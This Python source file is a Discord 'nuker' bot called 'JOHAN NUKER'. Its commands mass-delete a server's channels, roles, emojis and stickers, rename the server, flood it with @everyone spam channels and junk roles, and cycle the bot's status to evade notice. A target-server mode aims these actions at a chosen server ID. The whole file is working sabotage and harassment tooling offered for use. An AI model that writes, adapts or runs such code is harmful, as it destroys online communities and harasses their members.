
# JOHAN NUKER | v1.3 | Developed by J0HAN

import discord, asyncio, sys, random, time
from colorama import Fore

# Set-up
backspace = "\033[F"
client = discord.Client(intents=discord.Intents.all())

# Configurations
print(Fore.WHITE)
with open("config.txt") as file:
        token = file.readline()
        userID = file.readline()
        prefix = file.readline()

if not len(userID) >= 18:
    print(Fore.YELLOW + "Invalid user ID given, won't affect anything as of now.")

if prefix == "":
    print(Fore.YELLOW + "Be warned, your prefix is set as a whitespace.")

# Console Mode
target_mode = input(Fore.WHITE + "\nEnable target server mode? (y/n) ")
if target_mode.lower() == "y":
    target_mode = True
    target_serverID = input("Target Server ID: ")
    if len(target_serverID) >= 18:
        try:
            target_serverID = int(target_serverID) 
        except:
            print(Fore.YELLOW + "Server ID is not correct, console mode turned off.")
            target_mode = False
    else:
        print(Fore.YELLOW + "Server ID is not correct, console mode turned off.")
        target_mode = False
else:
    target_mode = False

print(Fore.BLACK)

# Start-up
@client.event
async def on_ready():
    print(Fore.CYAN + """
     ██╗ ██████╗ ██╗  ██╗ █████╗ ███╗   ██╗    ███╗   ██╗██╗   ██╗██╗  ██╗███████╗██████╗ 
     ██║██╔═══██╗██║  ██║██╔══██╗████╗  ██║    ████╗  ██║██║   ██║██║ ██╔╝██╔════╝██╔══██╗
     ██║██║   ██║███████║███████║██╔██╗ ██║    ██╔██╗ ██║██║   ██║█████╔╝ █████╗  ██████╔╝
██   ██║██║   ██║██╔══██║██╔══██║██║╚██╗██║    ██║╚██╗██║██║   ██║██╔═██╗ ██╔══╝  ██╔══██╗
╚█████╔╝╚██████╔╝██║  ██║██║  ██║██║ ╚████║    ██║ ╚████║╚██████╔╝██║  ██╗███████╗██║  ██║
 ╚════╝  ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝    ╚═╝  ╚═══╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝""")
    print(Fore.WHITE)
    user = await client.fetch_user(userID)
    print(f"┏︱Bot: {client.user}")
    print(f"┠︱User: {user}")
    print(f"┗︱Prefix: {prefix}\n")

# Message Responder
@client.event
async def on_message(message):
    msg = message.content
    if target_mode == True:
        target_server = client.get_guild(target_serverID)
        ctx = target_server
    else:
        ctx = message.guild
    
    # Main
    async def message_spam(amount, channel, message):
        messages_sent = 0
        while messages_sent < amount:
            try:
                await channel.send("@everyone " + message)
                messages_sent += 1
                if not messages_sent == 1:
                    sys.stdout.write(backspace)
                    print(f"✚ Spam message sent! ({messages_sent}/{amount})")
                else:
                    print(Fore.GREEN + f"✚ Spam message sent! ({messages_sent}/{amount})")
            except:
                print(Fore.YELLOW + "━ Unable to send spam message.")
                await asyncio.sleep(0.1)
    
    async def mass_channel_ping(amount, channel_name, spam_message):
        print(Fore.WHITE + "\n▼ Beginning mass channel ping...")
        channels_made = 0
        start_time = time.time()
        while int(channels_made) < int(amount):
            try:
                new_channel = await ctx.create_text_channel(channel_name)
                channels_made += 1
                if not channels_made == 1:
                    sys.stdout.write(backspace)
                    sys.stdout.write(backspace)
                    print(f"✚ Text channel created! ({channels_made}/{amount})")
                else:
                    print(Fore.GREEN + f"✚ Text channel created! ({channels_made}/{amount})")
                try:
                    await message_spam(random.randint(1, 4), new_channel, spam_message)
                except:
                    print(Fore.YELLOW + "━ Unable to start spamming messages.")
            except:
                print(Fore.YELLOW + "━ Unable to create text channel.")
                await asyncio.sleep(0.2)
        sys.stdout.write(backspace)
        print(Fore.WHITE + "▲ Mass channel ping has been finished! (" + str(time.time() - start_time) + "s)")
    
    async def mass_channels(amount, channel_name):
        print(Fore.WHITE + "\n▼ Mass channel creation is in progress...")
        channels_made = 0
        start_time = time.time()
        while int(channels_made) < int(amount):
            try:
                await ctx.create_text_channel(channel_name)
                channels_made += 1
                if not channels_made == 1:
                    sys.stdout.write(backspace)
                    print(f"✚ Text channel created! ({channels_made}/{amount})")
                else:
                    print(Fore.GREEN + f"✚ Text channel created! ({channels_made}/{amount})")
            except:
                print(Fore.YELLOW + "━ Unable to create text channel.")
                await asyncio.sleep(0.2)
        print(Fore.WHITE + "▲ Mass channel creation has been finished! (" + str(time.time() - start_time) + "s)")

    async def mass_roles(amount, role_name):
        print(Fore.WHITE + "\n▼ Mass role creation is in progress...")
        roles_made = 0
        start_time = time.time()
        while int(roles_made) < int(amount):
            try:
                await ctx.create_role(name=role_name)
                roles_made += 1
                if not roles_made == 1:
                    sys.stdout.write(backspace)
                    print(f"✚ Role created! ({roles_made}/{amount})")
                else:
                    print(Fore.GREEN + f"✚ Role created! ({roles_made}/{amount})")
            except:
                print(Fore.YELLOW + "━ Unable to create role.")
                await asyncio.sleep(0.2)
        print(Fore.WHITE + "▲ Mass role creation has been finished! (" + str(time.time() - start_time) + "s)")

    # Deleting
    async def del_channels():
        print(Fore.WHITE + "\n▼ Deleting all the channels...")
        channels_deleted = 0
        total_channels = len(ctx.channels)
        start_time = time.time()
        for channel in ctx.channels:
            try:
                await channel.delete()
                channels_deleted += 1
                if not channels_deleted == 1:
                    sys.stdout.write(backspace)
                    print(f"✚ Channel deleted! ({channels_deleted}/{total_channels})")
                else:
                    print(Fore.GREEN + f"✚ Channel deleted! ({channels_deleted}/{total_channels})")
            except:
                print(Fore.YELLOW + "━ Unable to delete channel.")
        print(Fore.WHITE + "▲ All channels that can be deleted have been deleted. (" + str(time.time() - start_time) + "s)")

    
    async def del_roles():
        print(Fore.WHITE + "\n▼ Deleting all the roles...")
        roles_deleted = 0
        total_roles = len(ctx.roles)
        start_time = time.time()
        for role in ctx.roles:
            try:
                await role.delete()
                roles_deleted += 1
                if not roles_deleted == 1:
                    sys.stdout.write(backspace)
                    print(f"✚ Role deleted! ({roles_deleted}/{total_roles})")
                else:
                    print(Fore.GREEN + f"✚ Role deleted! ({roles_deleted}/{total_roles})")
            except:
                print(Fore.YELLOW + "━ Unable to delete role.")
        print(Fore.WHITE + "▲ All roles that can be deleted have been deleted. (" + str(time.time() - start_time) + "s)")

    async def del_emojis():
        print(Fore.WHITE + "\n▼ Deleting all the emojis...")
        for emoji in ctx.emojis:
            try:
                await emoji.delete()
                print(Fore.GREEN + f"✚ Emoji deleted!")
            except:
                print(Fore.YELLOW + "━ Unable to delete emoji.")
        print(Fore.WHITE + "▲ All the emojis have been deleted!")
    
    async def del_stickers():
        print(Fore.WHITE + "\n▼ Deleting all the stickers...")
        for sticker in ctx.stickers:
            try:
                await sticker.delete()
                print(Fore.GREEN + f"✚ Sticker deleted!")
            except:
                print(Fore.YELLOW + "━ Unable to delete sticker.")
        print(Fore.WHITE + "▲ All the stickers have been deleted!")

    async def hider():
        print(Fore.WHITE + "\n◄ Hider function has been used!")
        try:
            await client.change_presence(status=discord.Status.offline)
            await asyncio.sleep(1)
            await client.change_presence(status=discord.Status.online)
            print(Fore.GREEN + "✚ Status changer looks like it's able to work!")
            while True:
                try:
                    await client.change_presence(status=discord.Status.offline)
                    await asyncio.sleep(1)
                    await client.change_presence(status=discord.Status.online)
                    await asyncio.sleep(1)
                except:
                    print(Fore.YELLOW + "\nHider has broke, it has now been cancelled.")
                    break
        except:
            print(Fore.YELLOW + "━ Status changer doesn't seem like it's able to work.")

    # Commands (feel free to rename)
    try:
        if msg.startswith(f"{prefix}help"):
            print(Fore.WHITE + f"\n◄ The help command has been used!")
            embed = discord.Embed(title="JOHAN NUKER", description=f"""**Commands:**
* {prefix}nuke - Automatic nuke
* {prefix}mcp [amount] [channel name] [spam message] - Creates channels and then sends 1-4 messages in them*
* {prefix}channels [amount] [name] - Creates a specified amount of channels with the given name
* {prefix}roles [amount] [name] - Creates a certain amount of roles with whatever name you want
* {prefix}del - Deletes all channels, roles, emojis, and stickers
* {prefix}cdel - Deletes all channels
* {prefix}rdel - Deletes all roles
* {prefix}edel - Deletes all emojis
* {prefix}sdel - Deletes all stickers
* {prefix}hide - Changes status from online to offline every second (might slow down other functions)
*No need to add everyone ping, it is automatically added at the start of the message with a space after.""", colour=0x336EFF)
            try:
                await message.reply(embed=embed)
                print(Fore.GREEN + "✚ Help message successfully sent!")
            except:
                print(Fore.YELLOW + "━ Unable to send help message.")

        if msg.startswith(f"{prefix}nuke"):
            if target_mode == True:
                await target_server.edit(name="NUKED BY J0HAN")
            else:
                await message.guild.edit(name="NUKED BY J0HAN")
            await del_channels()
            await del_roles()
            await del_emojis()
            await del_stickers()
            await mass_channel_ping(50, "johan-was-here", "SERVER FUCKED BY J0HAN")
            await mass_roles(100, "J0HAN WAS HERE")
            print(Fore.BLUE + "\n► NUKE OVER")

        if msg.startswith(f"{prefix}mcp"):
            command = msg.split(" ", 3)
            await message.reply("Be warned, this is in beta.")
            try:
                spam_amount = int(command[1])
            except:
                await message.reply("Please enter a valid number for the amount.")

            if not command[2] == None:
                if not command[3] == None:
                    await mass_channel_ping(spam_amount, command[2], command[3])
                else:
                    await message.reply("Please enter a spam message.")
            else:
                await message.reply("Please enter a channel name.")

        if msg.startswith(f"{prefix}channels"):
            command = msg.split(" ")
            if not command[1] == None:
                try:
                    channel_amount = int(command[1])
                except:
                    await message.reply("Please enter a valid number for the amount.")
                
                if not command[2] == None:
                    await mass_channels(channel_amount, command[2])
                else:
                    await message.reply("Please enter a channel name.")
            else:
                await message.reply("Please enter an amount.")

        if msg.startswith(f"{prefix}roles"):
            command = msg.split(" ")
            if not command[1] == None:
                try:
                    role_amount = int(command[1])
                except:
                    await message.reply("Please enter a valid number for the amount.")

                if not command[2] == None:
                    await mass_roles(role_amount, command[2])
                else:
                    await message.reply("Please enter a role name.")
            else:
                await message.reply("Please enter an amount.")

        if msg.startswith(f"{prefix}del"):
            await del_channels()
            await del_roles()
            await del_emojis()
            await del_stickers()
            print(Fore.BLUE + "\n► MASS DELETION OVER")

        if msg.startswith(f"{prefix}cdel"):
            await del_channels()

        if msg.startswith(f"{prefix}rdel"):
            await del_roles()

        if msg.startswith(f"{prefix}edel"):
            await del_emojis()

        if msg.startswith(f"{prefix}sdel"):
            await del_stickers()

        if msg.startswith(f"{prefix}hide"):
            await hider()
    except:
        print(Fore.YELLOW + "\nWhoops, looks like you encountered an unknown error.")

try:
    client.run(token)
except:
    print(Fore.RED + "INVALID TOKEN GIVEN")
    print(Fore.WHITE)
